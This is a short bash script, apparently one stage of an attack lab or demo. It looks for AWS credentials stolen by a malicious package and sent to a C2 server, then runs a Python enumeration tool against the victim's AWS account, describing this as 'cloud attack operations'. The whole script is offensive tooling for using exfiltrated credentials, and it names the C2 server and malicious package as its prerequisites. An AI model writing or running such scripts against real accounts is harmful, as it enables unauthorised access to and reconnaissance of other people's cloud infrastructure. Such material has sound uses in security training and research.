#!/bin/bash
# Execute cloud attack operations using stolen credentials

set -e

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$DIR"

echo "=========================================="
echo "  Cloud Attack Operations"
echo "=========================================="
echo ""

# Check if stolen credentials exist
CREDS_FILE="../1-attacker-infrastructure/stolen_aws_credentials"
if [ ! -f "$CREDS_FILE" ]; then
    echo "[-] Error: Stolen credentials not found"
    echo "    Expected location: $CREDS_FILE"
    echo ""
    echo "    Make sure:"
    echo "    1. C2 server is running"
    echo "    2. Victim has installed malicious package"
    echo "    3. Credentials were exfiltrated successfully"
    exit 1
fi

echo "[+] Found stolen credentials"
echo ""

# Install dependencies
echo "[*] Installing dependencies..."
pip install -q -r requirements.txt

# Execute enumeration
echo "[*] Starting AWS enumeration..."
echo ""
python3 enumerate_aws.py

echo ""
echo "[SUCCESS] Attack operations complete!"
echo ""
